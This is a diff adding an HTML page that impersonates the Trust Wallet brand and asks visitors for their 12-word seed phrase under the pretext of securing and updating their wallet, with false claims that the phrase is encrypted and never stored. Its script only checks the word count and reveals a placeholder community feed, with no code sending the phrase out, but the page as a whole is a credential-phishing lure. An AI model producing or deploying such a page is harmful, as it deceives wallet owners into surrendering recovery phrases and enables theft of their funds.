@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trust Wallet • Connect</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Inter', sans-serif; background:#f8fafc; }
+
+    .login-page {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .login-box {
+      background: white;
+      width: 100%;
+      max-width: 440px;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 40px 35px;
+      text-align: center;
+    }
+    .logo-container {
+      margin-bottom: 25px;
+    }
+    .logo-text {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1e40af;
+      margin-bottom: 8px;
+    }
+    .trust-logo {
+      width: 90px;
+      height: 90px;
+      margin: 0 auto;
+    }
+    h1 { font-size: 28px; margin-bottom: 10px; }
+    .subtitle { color: #475569; margin-bottom: 30px; line-height: 1.5; }
+    textarea {
+      width: 100%;
+      height: 130px;
+      padding: 16px;
+      border: 2px solid #cbd5e1;
+      border-radius: 12px;
+      font-size: 16px;
+      resize: vertical;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      background: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      margin: 25px 0 20px;
+      cursor: pointer;
+    }
+    .secure {
+      background: #f0f9ff;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: left;
+      font-size: 14.5px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Login Screen -->
+  <div class="login-page" id="loginScreen">
+    <div class="login-box">
+      <!-- New Trust Wallet Logo -->
+      <div class="logo-container">
+        <div class="logo-text">Trust Wallet</div>
+        <svg class="trust-logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+          <path d="M100 25 L165 65 L165 135 L100 175 L35 135 L35 65 Z" fill="#1e40af"/>
+          <path d="M100 25 L165 65 L100 105 L35 65 Z" fill="#3b82f6"/>
+          <text x="100" y="125" text-anchor="middle" fill="white" font-size="22" font-weight="bold" font-family="Arial">TRUST</text>
+        </svg>
+      </div>
+
+      <h1>Welcome Back</h1>
+      <p class="subtitle">Enter your wallet's seed phrase to secure and update your wallet</p>
+
+      <div style="text-align:left; font-weight:500; margin-bottom:8px;">Seed Phrase</div>
+      <textarea id="seedInput" placeholder="Enter your 12-word seed phrase..."></textarea>
+
+      <p style="text-align:left; font-size:14px; color:#64748b; margin:10px 0 25px;">Enter all 12 words separated by spaces</p>
+
+      <button onclick="handleLogin()">Confirm</button>
+
+      <p>Don't have an account? <span style="color:#2563eb; cursor:pointer;">Sign Up</span></p>
+
+      <div class="secure">
+        <strong style="display:flex; align-items:center; gap:8px;">🔒 Secure Sign In</strong>
+        <ul style="margin-top:12px; padding-left:20px; line-height:1.6;">
+          <li>Your seed phrase is encrypted and never stored in plain text</li>
+          <li>Only you have access to your account</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Social Feed -->
+  <div id="feedScreen" style="display:none; padding:20px; max-width:700px; margin:40px auto;">
+    <header style="display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #e2e8f0; margin-bottom:30px;">
+      <h2 style="color:#2563eb;">Connect</h2>
+      <button onclick="logout()" style="padding:8px 24px; background:#ef4444; color:white; border:none; border-radius:8px; cursor:pointer;">Logout</button>
+    </header>
+
+    <h3>Community Feed</h3>
+    <div style="background:white; padding:25px; border-radius:12px; margin:20px 0;">
+      Welcome to the community! Share your thoughts and connect with others.
+    </div>
+  </div>
+
+  <script>
+    function handleLogin() {
+      const seed = document.getElementById('seedInput').value.trim();
+      if (seed.split(/\s+/).length >= 12) {
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('feedScreen').style.display = 'block';
+      } else {
+        alert("Please enter all 12 words of your seed phrase.");
+      }
+    }
+
+    function logout() {
+      document.getElementById('feedScreen').style.display = 'none';
+      document.getElementById('loginScreen').style.display = 'flex';
+      document.getElementById('seedInput').value = '';
+    }
+  </script>
+</body>
+</html>
